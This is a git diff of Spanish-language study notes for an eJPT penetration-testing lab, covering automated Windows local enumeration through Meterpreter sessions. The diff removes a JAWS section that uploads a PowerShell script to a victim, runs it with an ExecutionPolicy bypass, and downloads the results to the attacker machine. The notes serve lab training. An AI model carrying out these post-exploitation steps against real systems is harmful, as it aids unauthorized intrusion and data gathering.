@@ -4,9 +4,9 @@ Tags: #LocalEnumeration #PrivEsc #Windows #Metasploit #Meterpreter
 
 ## Enumeración local Automática (Tools) en Windows 
 
-```bash 
-# Enumeración con Meterpreter 
+### Enumeración con Meterpreter 
 
+```bash 
 ❯ sessions <ID>                                    # Regresas a la sesión de Meterpreter que tenias 
 
 ❯ background                                       # Colocamos la sesion en segundo plano 
@@ -63,31 +63,4 @@ Tags: #LocalEnumeration #PrivEsc #Windows #Metasploit #Meterpreter
 	❯ options 
 	❯ set SESSION <ID>
 	❯ run
-```
-
-* [JAWS](https://github.com/411Hall/JAWS)
-
-```bash 
-# Just Another Windows (Enum) Script
-
-# Lab de eJPT 
-❯ Ctrl + Shift + Alt                 # Abre y cierra una consola para copiar codigo de la maquina real a la maquina del lab
-
-# Creas un archivo llamado 'jaws-enum.ps1' y le pegas el contenido.
-
-
-# En Meterpreter 
-❯ cd C:\\
-❯ mkdir Temp
-❯ cd Temp                            # El directorio 'Temp' tiene permisos de lectura y escritura 
-
-❯ upload /root/jaws-enum.ps1         # Cargas el archivo desde tu maquina de atacante a la victima 
-❯ shell                              # Cambias a la Shell de Windows 
-
-# Comandos Windows 
-❯ powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
-
-# Regresas a Meterpreter para poderlos descargar a tu maquina de atacante 
-❯ Ctrl + c
-❯ download JAWS-Enum.txt -> /root/JAWS-Enum.txt
 ```
